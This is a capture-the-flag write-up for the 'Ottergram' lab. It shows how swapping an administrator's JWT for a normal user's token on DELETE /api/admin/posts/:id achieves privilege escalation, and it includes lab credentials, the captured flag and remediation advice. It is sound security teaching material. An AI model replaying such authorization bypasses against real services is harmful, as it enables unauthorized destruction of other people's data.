# Ottergram — Broken Access Control.

## Challenge Information

* **Challenge:** Ottergram
* **Category:** Broken Access Control
* **Vulnerability:** Broken Function-Level Authorization (BFLA)
* **Scope:** `https://<lab-id>.labs-app.bugforge.io/*`
* **Admin Credentials:** `admin:admin123`

---

## Objective

The objective of this lab is to identify a **Broken Access Control** vulnerability that allows a normal user to perform an administrative action.

The application provides administrative functionality for managing flagged posts. The goal is to determine whether these administrative API endpoints properly verify the user's privileges.

---

## 1. Login as Administrator

First, log in to the application using the provided administrator credentials:

```text
Username: admin
Password: admin123
```

After logging in, inspect the application's functionality and monitor requests using the browser's Developer Tools or Burp Suite.

---

## 2. Flag a Post as Administrator

Navigate to a post and flag it.

For example, flagging post `3` generates the following request:

```http
POST /api/posts/3/flag
```

The request contains the administrator's JWT:

```http
Authorization: Bearer <ADMIN_TOKEN>
```

The server responds:

```json
{
  "message": "Post flagged successfully"
}
```

This confirms that the post has been added to the flagged-post list.

---

## 3. Identify the Administrative Endpoint

Navigate to the administrator/settings page and inspect the actions available for flagged posts.

The application provides options such as:

* Mark as OK
* Delete Post

The **Delete Post** functionality generates:

```http
DELETE /api/admin/posts/3
```

Initially, this request is made using the administrator's token.

The response is:

```json
{
  "message": "Post deleted successfully"
}
```

This reveals an interesting endpoint:

```text
/api/admin/posts/:id
```

Because the endpoint is explicitly under `/api/admin/`, it should only be accessible to administrators.

---

## 4. Create/Login as a Normal User

Next, log out of the administrator account and log in as a normal user.

In this case, the test account was:

```text
Username: test
```

The normal user's JWT contained information similar to:

```json
{
  "id": 4,
  "username": "test"
}
```

Unlike the administrator account, this user should not have permission to perform administrative operations.

---

## 5. Replay the Administrative Request

Capture the following request:

```http
DELETE /api/admin/posts/3
```

The important part is the `Authorization` header.

Replace the administrator's token:

```http
Authorization: Bearer <ADMIN_TOKEN>
```

with the normal user's token:

```http
Authorization: Bearer <TEST_USER_TOKEN>
```

The final request becomes:

```http
DELETE /api/admin/posts/3
Host: <lab-id>.labs-app.bugforge.io
Authorization: Bearer <TEST_USER_TOKEN>
```

No other important part of the request needs to be changed.

---

## 6. Observe the Result

Send the modified request.

The server responds with HTTP `200`:

```json
{
  "message": "Post deleted successfully",
  "flag": "bug{IMAqbDnKfPGELvjjFFtGBLiwVys95rmg}"
}
```

The important observation is that the **normal user was able to successfully perform an administrative delete operation**.

---

## Vulnerability Analysis

The application correctly identifies the authenticated user through the JWT, but the administrative endpoint fails to properly verify whether that user has administrative privileges.

The vulnerable endpoint is:

```http
DELETE /api/admin/posts/:id
```

A secure application should perform an authorization check similar to:

```text
Is the authenticated user an administrator?
        |
        +-- YES → Allow the operation
        |
        +-- NO  → Return 401/403
```

Instead, the application effectively behaves like:

```text
Is the JWT valid?
        |
        +-- YES → Allow the administrative operation
```

Therefore, any authenticated user who knows the endpoint can invoke the administrative functionality.

---

## Vulnerability Classification

### Broken Access Control

The application fails to restrict administrative functionality to authorized users.

### Broken Function-Level Authorization (BFLA)

The normal user can directly invoke a function intended only for administrators:

```http
DELETE /api/admin/posts/3
```

### Vertical Privilege Escalation

A low-privileged user is able to perform an operation belonging to a higher-privileged administrator.

### IDOR-Style Behavior

The post ID is directly supplied by the client:

```text
/api/admin/posts/3
```

This means the endpoint also relies on a user-controlled object identifier without demonstrating appropriate authorization checks.

---

## Attack Flow

```text
                    Administrator
                         |
                         v
                 Flag Post #3
                         |
                         v
              Discover admin endpoint
                         |
                         v
              DELETE /api/admin/posts/3
                         |
                         v
                Login as normal user
                         |
                         v
              Replace JWT token
                         |
                         v
              DELETE /api/admin/posts/3
                         |
                         v
                 HTTP 200 Success
                         |
                         v
                       FLAG
```

---

## Proof of Vulnerability

### Administrator Request

```http
DELETE /api/admin/posts/3
Authorization: Bearer <ADMIN_TOKEN>
```

Expected behavior:

```text
Administrator → Allowed
```

### Normal User Request

```http
DELETE /api/admin/posts/3
Authorization: Bearer <TEST_USER_TOKEN>
```

Actual behavior:

```text
Normal User → Allowed
```

This confirms that the endpoint does not enforce proper role-based authorization.

---

## Flag

```text
bug{IMAqbDnKfPGELvjjFFtGBLiwVys95rmg}
```

---

## Remediation

The server must perform authorization checks **server-side** before executing administrative actions.

For example:

```javascript
if (!req.user.isAdmin) {
    return res.status(403).json({
        message: "Forbidden"
    });
}
```

More generally:

1. Authenticate the user.
2. Determine the user's server-side role/permissions.
3. Verify that the requested operation is allowed for that role.
4. Only then perform the operation.
5. Never rely on the client to determine whether a user is an administrator.

Administrative endpoints such as:

```text
/api/admin/posts/:id
/api/admin/posts/:id/approve
```

should return `403 Forbidden` when accessed by a normal user.

---

## Key Takeaway

**Authentication is not authorization.**

The application successfully authenticated the normal user, but it failed to determine whether that user was authorized to perform an administrative operation.

The vulnerability was exploited by simply replacing the administrator's JWT with a normal user's JWT while keeping the administrative API endpoint unchanged.